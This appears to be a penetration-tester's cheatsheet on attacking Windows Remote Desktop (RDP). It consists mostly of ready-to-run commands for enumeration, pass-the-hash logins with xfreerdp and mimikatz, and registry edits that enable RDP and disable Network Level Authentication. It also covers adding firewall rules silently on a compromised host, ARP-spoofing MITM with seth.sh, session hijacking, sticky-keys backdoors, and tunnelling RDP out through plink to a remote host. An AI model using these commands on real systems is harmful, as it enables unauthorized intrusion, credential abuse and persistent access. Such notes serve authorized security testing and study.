# Remote Desktop Protocol (RDP) 

TCP 3389

Beware - On Windows 11, [Network Level Authentication (NLA)](https://en.wikipedia.org/wiki/Network_Level_Authentication) is enabled by default for all RDP connections.

```bash
remmina
xfreerdp /u:$username /p:$Password /v:$IP
rdesktop $ip
```

## Enumerating RDP

Modified from HackTricks - [[Nmap-Cheatsheet]], [[Nmap-AllTheScripts]]
```bash
sudo nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 192.168.223.119 -e $interfaceForIdiotProofing -oA nmap/rdpenum
```

[[Impacket-Cheatsheet]]
```bash
impacket-rdp_check
# Impacket v0.11.0 - Copyright 2023 Fortra
# usage: rdp_check.py [-h] [-hashes LMHASH:NTHASH] target
# Test whether an account is valid on the target host using the RDP protocol.
# positional arguments: target [[domain/]username[:password]@]<targetName or address>
# options:
-h, --help # show this help message and exit
# authentication:
-hashes $LMHASH:$NTHASH # NTLM hashes, format is LMHASH:NTHASH
```

## Exploitation

[[Crackmapexec-Cheatsheet]]
```bash
# Remotely enable RDP using CrackMapExec
sudo crackmapexec smb $IP -u $user -p $password -M rdp -o ACTION=enable
```
[[Pass-The-Hash]] attacks with RDP. For non domain-joined machines `rdesktop` won't connect; use `xfreerdp` instead, which supports NLA for non domain-joined machines. `xfreerdp` allows for  [[Pass-The-Hash]]:

```bash
# RDP through Pass-the-Hash
xfreerdp /u:USER /d:DOMAIN /pth:NTLM /v:server.domain.local

xfreerdp /v:$IP /u:DOMAIN\\Administrator /pth:$ntml

# RDP using mimikatz and PtH
sekurlsa::pth /user:user /domain:domain.local /ntlm:xxxxxxxxxxxxxxx /run:"mstsc.exe /restrictedadmin"
```

`cmd.exe`
```bash
# Enable RDP from cmd.exe
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Disable RDP from cmd.exe
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f

# Disable NLA (Network Layer Authentication) requirement
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

# You can also do it through the firewall
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable
```
`powershell.exe`
```powershell
# Enable RDP from cmd.exe
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Disable RDP from cmd.exe
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f

# Disable NLA (Network Layer Authentication) requirement
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

# You can also do it through the firewall
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable
```
[[MITM-Attacks]]
```bash
# You can try to attack existing RDP connections
# seth.sh is a great tool for that
# It performs an ARP spoofing attack
./seth.sh eth0 <IP attacker> <IP victim> <Gateway | Host>
```
## Post NT System compromise

Add additional users
```powershell
net localgroup "Remote Desktop Users" $UserLoginName /add
```

Get session information
```powershell
query user
```

[[Mimikatz-Cheatsheet]]
```c
ts::sessions        // Get sessions
ts::remote /id:2    // Connect to the session
```

Combining stickykeys or utilman techniques *you will be able to access a administrative CMD and any RDP session anytime*. *RDPs that have been backdoored with one of these techniques already with: [Stick  Keys Slayer](https://github.com/linuz/Sticky-Keys-Slayer)*

Shadow Attack - [AutoRDPwn](https://github.com/JoelGMSec/AutoRDPwn)

## Tunnelling Remote Desktop Protocol (RDP) 

Tunnelling Remote Desktop (RDP) from a Popped Windows using HTTP Tunnel as method of bypassing deep packet inspection from [GitHub OlivierLaflamme/Cheatsheet-God Cheatsheet_Networking.txt](https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_Networking.txt). From target Windows machine add required firewall rules without prompting the user:
```powershell
netsh advfirewall firewall add rule name="httptunnel_client" dir=in action=allow program="httptunnel_client.exe" enable=yes
netsh advfirewall firewall add rule name="3000" dir=in action=allow protocol=TCP localport=3000
netsh advfirewall firewall add rule name="1080" dir=in action=allow protocol=TCP localport=1080
netsh advfirewall firewall add rule name="1079" dir=in action=allow protocol=TCP localport=1079

# Start the http tunnel client
httptunnel_client.exe

# Create HTTP reverse shell by connecting to localhost port 3000
plink -l root -pw 23847sd98sdf987sf98732 -R 3389:<local host>:3389 <remote host> -P 3000
```

## References

[Wikipedia Network Level Authentication (NLA)](https://en.wikipedia.org/wiki/Network_Level_Authentication)
[haax.fr RDP Exploitation](https://cheatsheet.haax.fr/windows-systems/exploitation/rdp_exploitation/)
[HackTricks - Pentesting RDP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp)
[AutoRDPwn](https://github.com/JoelGMSec/AutoRDPwn)
[Stick  Keys Slayer](https://github.com/linuz/Sticky-Keys-Slayer)
[GitHub OlivierLaflamme/Cheatsheet-God Cheatsheet_Networking.txt](https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_Networking.txt)